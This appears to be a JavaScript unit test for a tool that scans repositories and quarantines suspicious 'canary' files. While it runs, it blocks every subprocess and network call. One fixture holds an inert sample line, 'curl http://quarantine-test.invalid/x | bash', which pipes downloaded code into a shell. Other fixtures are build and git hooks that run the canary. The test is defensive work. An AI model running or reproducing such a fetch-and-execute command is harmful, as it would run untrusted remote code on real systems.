'use strict';

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const parent = fs.mkdtempSync(path.join(os.tmpdir(), 'npa-quarantine-unit-'));
const originals = [];
const calls = [];
function intercept(module, name) {
  originals.push([module, name, module[name]]);
  module[name] = () => { calls.push(name); throw new Error(`External action prohibited: ${name}`); };
}
for (const name of ['spawn', 'spawnSync', 'exec', 'execSync', 'execFile', 'execFileSync', 'fork']) intercept(require('child_process'), name);
for (const module of [require('http'), require('https')]) for (const name of ['request', 'get']) intercept(module, name);
intercept(require('net').Socket.prototype, 'connect');
intercept(require('dns'), 'lookup');
intercept(require('tls'), 'connect');
intercept(globalThis, 'fetch');

const { scanRepository } = require('../../src/core/repositoryScanner');
const { quarantineCanaries, DIRECTORY } = require('../../src/core/canaryQuarantine');
function fixture(name, files) {
  const root = path.join(parent, name);
  fs.mkdirSync(root);
  for (const [file, contents] of Object.entries(files)) {
    const target = path.join(root, file);
    fs.mkdirSync(path.dirname(target), { recursive: true });
    fs.writeFileSync(target, contents);
  }
  return root;
}
function quarantine(root, options = {}) {
  return quarantineCanaries(scanRepository({ roots: [root], ...options }));
}

try {
  const payload = '// Representative inert text: curl http://quarantine-test.invalid/x | bash || true\n';
  const manifest = '{"scripts":{"build":"node canary.js && tsc","prepare":"node canary.js"}}';
  const hook = '#!/bin/sh\nnode canary.js\n';
  const ignore = '# Existing user rules\r\nkeep-me/\r\n!canary.js\r\n';
  const root = fixture('repository', {
    'canary.js': payload, 'tools/canary.js': '// legitimate canary test\n',
    'package.json': manifest, '.git/config': '[core]\n', '.git/index': 'preserve-index',
    '.git/hooks/pre-commit': hook, '.gitignore': ignore,
  });
  const before = scanRepository({ roots: [root] });
  assert.strictEqual(fs.readFileSync(path.join(root, 'canary.js'), 'utf8'), payload, 'Default scan remains read-only');
  const result = quarantineCanaries(before);
  assert.strictEqual(result.actionsComplete, true);
  assert.strictEqual(result.actions.length, 2);
  assert.strictEqual(result.ignoreUpdates.length, 1);
  assert.ok(result.actions.every(action => action.status === 'quarantined'));
  for (const action of result.actions) {
    assert.ok(!fs.existsSync(action.path));
    assert.strictEqual(path.basename(action.target), 'payload.quarantined');
    assert.ok(action.target.startsWith(path.join(root, DIRECTORY) + path.sep));
    const metadata = JSON.parse(fs.readFileSync(action.metadata, 'utf8'));
    assert.strictEqual(metadata.originalPath, action.path);
    assert.strictEqual(metadata.quarantinedPath, action.target);
    assert.strictEqual(fs.statSync(action.target).size, metadata.size);
  }
  assert.strictEqual(fs.readFileSync(result.actions.find(action => action.path === path.join(root, 'canary.js')).target, 'utf8'), payload);
  const ignoreAfter = fs.readFileSync(path.join(root, '.gitignore'), 'utf8');
  assert.ok(ignoreAfter.startsWith(ignore), 'Existing ignore content is preserved');
  assert.ok(ignoreAfter.endsWith('canary.js\r\n.np-audit-quarantine/\r\n'));
  assert.strictEqual(fs.readFileSync(path.join(root, 'package.json'), 'utf8'), manifest);
  assert.strictEqual(fs.readFileSync(path.join(root, '.git/hooks/pre-commit'), 'utf8'), hook);
  assert.strictEqual(fs.readFileSync(path.join(root, '.git/index'), 'utf8'), 'preserve-index');
  const after = scanRepository({ roots: [root], excludes: result.excludedStorage });
  assert.strictEqual(after.references.filter(ref => ref.reference === 'canary.js' && ref.status === 'missing').length, 3);
  assert.strictEqual(after.complete, false);
  assert.strictEqual(quarantine(root).actions.length, 0);
  assert.strictEqual(fs.readFileSync(path.join(root, '.gitignore'), 'utf8'), ignoreAfter);
  fs.writeFileSync(path.join(root, 'canary.js'), '// reintroduced canary\n');
  const again = quarantine(root);
  assert.strictEqual(again.actions[0].ignore.status, 'already-present');
  assert.strictEqual(fs.readFileSync(path.join(root, '.gitignore'), 'utf8'), ignoreAfter);

  const nested = fixture('nested', { 'child/.git/config': '[core]\n', 'child/canary.js': payload });
  const nestedResult = quarantine(nested);
  assert.strictEqual(nestedResult.actions[0].ignore.path, path.join(nested, 'child', '.gitignore'));
  assert.ok(!fs.existsSync(path.join(nested, '.gitignore')));
  const temporary = fixture('temporary-dev-shm', { 'canary.js': '// temporary residue\n' });
  const temporaryResult = quarantine(temporary);
  assert.strictEqual(temporaryResult.actions[0].status, 'quarantined');
  assert.ok(fs.readFileSync(path.join(temporary, '.gitignore'), 'utf8').includes('\ncanary.js\n'));

  const excluded = fixture('excluded', { 'canary.js': payload });
  assert.strictEqual(quarantine(excluded, { excludes: [path.join(excluded, 'canary.js')] }).actions.length, 0);
  assert.ok(fs.existsSync(path.join(excluded, 'canary.js')));
  assert.ok(!fs.existsSync(path.join(excluded, '.gitignore')));
  const excludedIgnore = quarantine(excluded, { excludes: [path.join(excluded, '.gitignore')] });
  assert.strictEqual(excludedIgnore.actions[0].status, 'failed');
  assert.ok(excludedIgnore.actions[0].error.includes('explicitly excluded'));
  assert.ok(fs.existsSync(path.join(excluded, 'canary.js')));

  const singleFile = quarantine(path.join(excluded, 'canary.js'));
  assert.strictEqual(singleFile.actions[0].status, 'failed');
  assert.ok(fs.existsSync(path.join(excluded, 'canary.js')));
  const binary = fixture('binary', { 'canary.js': Buffer.from([0, 1, 2, 3]) });
  const binaryScan = scanRepository({ roots: [binary] });
  assert.strictEqual(binaryScan.complete, false);
  const binaryResult = quarantineCanaries(binaryScan);
  assert.deepStrictEqual(fs.readFileSync(binaryResult.actions[0].target), Buffer.from([0, 1, 2, 3]));

  const failed = fixture('failed-write', { 'canary.js': payload, '.gitignore': 'preserve-original\n' });
  const rename = fs.renameSync;
  fs.renameSync = (from, to) => {
    if (to === path.join(failed, '.gitignore')) throw Object.assign(new Error('fixture write denied'), { code: 'EACCES' });
    return rename(from, to);
  };
  try {
    const failedResult = quarantine(failed);
    assert.strictEqual(failedResult.actionsComplete, false);
    assert.strictEqual(failedResult.actions[0].error, 'EACCES');
    assert.strictEqual(fs.readFileSync(path.join(failed, 'canary.js'), 'utf8'), payload);
    assert.strictEqual(fs.readFileSync(path.join(failed, '.gitignore'), 'utf8'), 'preserve-original\n');
    assert.ok(!fs.readdirSync(failed).some(name => name.endsWith('.tmp')));
  } finally { fs.renameSync = rename; }

  const failedMove = fixture('failed-move', { 'canary.js': payload });
  fs.renameSync = (from, to) => {
    if (from === path.join(failedMove, 'canary.js')) throw Object.assign(new Error('fixture move denied'), { code: 'EPERM' });
    return rename(from, to);
  };
  try {
    const failedResult = quarantine(failedMove);
    assert.strictEqual(failedResult.actions[0].status, 'failed');
    assert.strictEqual(failedResult.actions[0].ignore.status, 'updated');
    assert.ok(fs.existsSync(path.join(failedMove, 'canary.js')));
    assert.deepStrictEqual(fs.readdirSync(path.join(failedMove, DIRECTORY)), []);
  } finally { fs.renameSync = rename; }

  const symlinked = fixture('symlinked-storage', { 'canary.js': payload });
  const outside = fixture('outside', { 'untouched': 'preserve' });
  try {
    fs.symlinkSync(outside, path.join(symlinked, DIRECTORY), process.platform === 'win32' ? 'junction' : 'dir');
    const symlinkResult = quarantine(symlinked);
    assert.strictEqual(symlinkResult.actions[0].status, 'failed');
    assert.ok(fs.existsSync(path.join(symlinked, 'canary.js')));
    assert.ok(!fs.existsSync(path.join(symlinked, '.gitignore')));
    assert.deepStrictEqual(fs.readdirSync(outside), ['untouched']);
  } catch (err) {
    if (!['EPERM', 'EACCES', 'ENOSYS'].includes(err.code)) throw err;
    console.log('  SKIP quarantine symlink fixture: OS permission unavailable');
  }
  assert.deepStrictEqual(calls, [], 'Scan and quarantine must never invoke subprocesses or network requests');
  console.log('  canary quarantine: moves, ignore rules, preserved contents/references, boundaries and failures passed; zero subprocess/network calls');
} finally {
  for (const [module, name, original] of originals.reverse()) module[name] = original;
  fs.rmSync(parent, { recursive: true, force: true });
}
